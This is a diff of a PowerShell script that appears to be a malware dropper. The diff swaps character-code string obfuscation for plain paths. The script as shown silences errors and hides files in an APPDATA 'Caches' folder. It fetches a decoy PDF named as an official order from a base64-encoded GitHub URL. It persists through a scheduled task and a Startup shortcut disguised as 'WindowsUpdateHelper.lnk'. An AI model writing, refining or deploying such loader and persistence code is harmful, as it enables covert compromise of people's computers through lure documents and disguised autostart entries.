@@ -1,18 +1,13 @@
 $ErrorActionPreference = 'SilentlyContinue'
 
-# === LEVEL 2: STRING OBFUSCATION ===
-$ap = [char]65+[char]112+[char]112+[char]68+[char]97+[char]116+[char]97
-$mi = [char]77+[char]105+[char]99+[char]114+[char]111+[char]115+[char]111+[char]102+[char]116
-$wi = [char]87+[char]105+[char]110+[char]100+[char]111+[char]119+[char]115
-$ca = [char]67+[char]97+[char]99+[char]104+[char]101+[char]115
-$cache = "$env:$ap\$mi\$wi\$ca"
+$cache = "$env:APPDATA\Microsoft\Windows\Caches"
 if (-not (Test-Path $cache)) { New-Item -ItemType Directory -Path $cache -Force | Out-Null }
 
-$flagFile = "$cache\"+([char]105+[char]110+[char]115+[char]116+[char]97+[char]108+[char]108+[char]101+[char]100)+'.'+([char]102+[char]108+[char]97+[char]103)
+$flagFile = "$cache\installed.flag"
 $isFirstRun = -not (Test-Path $flagFile)
 
 $pdfUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FzdHJvLW9wZW5zb3VyY2UvY2xvdWQtc3luYy10b29scy9tYWluL2Fzc2V0cy9OYWthel9Oby5fNjYxX3ZpZF8wMi4wMy4yMDI2LTQucGRm'))
-$pdfPath = "$cache\"+([char]78+[char]97+[char]107+[char]97+[char]122)+'_No._661_vid_02.03.2026-4.pdf'
+$pdfPath = "$cache\Nakaz_No._661_vid_02.03.2026-4.pdf"
 
 $headers = @{'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'}
 
@@ -26,7 +21,7 @@ if ($isFirstRun) {
     }
 }
 
-$localPath = "$cache\launcher.ps1"
+$localPath = "$env:APPDATA\Microsoft\Windows\Caches\launcher.ps1"
 $currentPath = $MyInvocation.MyCommand.Path
 
 function Save-ScriptToDisk {
@@ -59,7 +54,7 @@ if (-not $taskExists) {
     } catch {}
 }
 
-$startupPath = "$env:$ap\$mi\$wi\Start Menu\Programs\Startup"
+$startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
 $lnkPath = "$startupPath\WindowsUpdateHelper.lnk"
 if (-not (Test-Path $lnkPath)) {
     $wshShell = New-Object -ComObject WScript.Shell
